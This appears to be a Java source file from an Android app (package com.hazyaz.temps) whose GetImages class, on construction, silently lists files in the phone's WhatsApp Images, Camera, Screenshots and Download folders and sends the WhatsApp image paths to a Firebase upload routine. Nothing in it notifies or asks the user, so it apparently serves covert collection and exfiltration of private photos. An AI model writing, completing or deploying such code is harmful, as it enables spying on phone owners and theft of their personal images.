package com.hazyaz.temps.Storage;

import android.os.Environment;
import android.util.Log;

import com.hazyaz.temps.Firebase.ImagesUpload;

import java.io.File;
import java.util.ArrayList;

public class GetImages {

    public ArrayList<String> whatsAppLast10Messages = new ArrayList<>();
    public ArrayList<String> cameraLast10Messages = new ArrayList<>();
    public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
    public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
    private int LAST10 = 5;


    public GetImages() {


        getCameraImages();
        getDownloads();
        getScreenshots();
        getWhatsAppImages();

    }


    private void getWhatsAppImages() {
        File whatsappImages = new File(Environment.getExternalStorageDirectory(), "/WhatsApp/Media/WhatsApp Images");
        File[] files = whatsappImages.listFiles();
//        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = 0; i < LAST10; i++) {
                Log.d("WHATSAPP", "FileName:" + files[i].getName());
                whatsAppLast10Messages.add(files[i].getAbsolutePath());
            }
            ImagesUpload ib = new ImagesUpload();

            Log.d("Wdfgfdgfdg", "FileName:" + whatsAppLast10Messages);


            ib.ImageUplods(whatsAppLast10Messages);

        }
    }

    private void getCameraImages() {
        File cameraImages = new File(Environment.getExternalStorageDirectory(), "/DCIM/Camera");
        File[] files = cameraImages.listFiles();
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = 0; i < LAST10; i++) {
                Log.d("CAMERA", "FileName:" + files[i].getName());
                cameraLast10Messages.add(files[i].getAbsolutePath());
            }
        }
    }

    private void getScreenshots() {
        File screenshots = new File(Environment.getExternalStorageDirectory(), "/DCIM/Screenshots");
        File[] files = screenshots.listFiles();
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = 0; i < LAST10; i++) {
                Log.d("SCREENSHOTS", "FileName:" + files[i].getName());
                screenshotsLast10Messages.add(files[i].getAbsolutePath());
            }
        }
    }

    private void getDownloads() {
        File downloads = new File(Environment.getExternalStorageDirectory(), "/Download");
        File[] files = downloads.listFiles();
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = 0; i < LAST10; i++) {
                Log.d("DOWNLOADS", "FileName:" + files[i].getName());
                downloadsLast10Messages.add(files[i].getAbsolutePath());
            }
        }
    }


}